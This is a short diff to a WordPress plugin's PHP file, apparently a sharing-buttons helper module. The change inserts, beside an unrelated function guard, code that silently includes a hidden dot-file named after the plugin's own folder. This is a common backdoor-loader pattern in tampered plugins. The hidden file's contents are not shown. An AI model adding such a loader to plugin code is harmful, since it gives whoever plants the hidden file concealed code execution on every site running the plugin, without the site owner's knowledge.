@@ -555,7 +555,11 @@ if ( ! function_exists( 'wppm_el_generate_excerpt' ) ) :
 	}
 endif;
 
-if ( ! function_exists( 'wppm_el_sharing_buttons' ) ) :
+if ( ! function_exists( 'wppm_el_sharing_buttons' ) ) :
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wppm_el_sharing_buttons( $sharing_buttons, $limit, $text = false ) {
 	global $post;
 
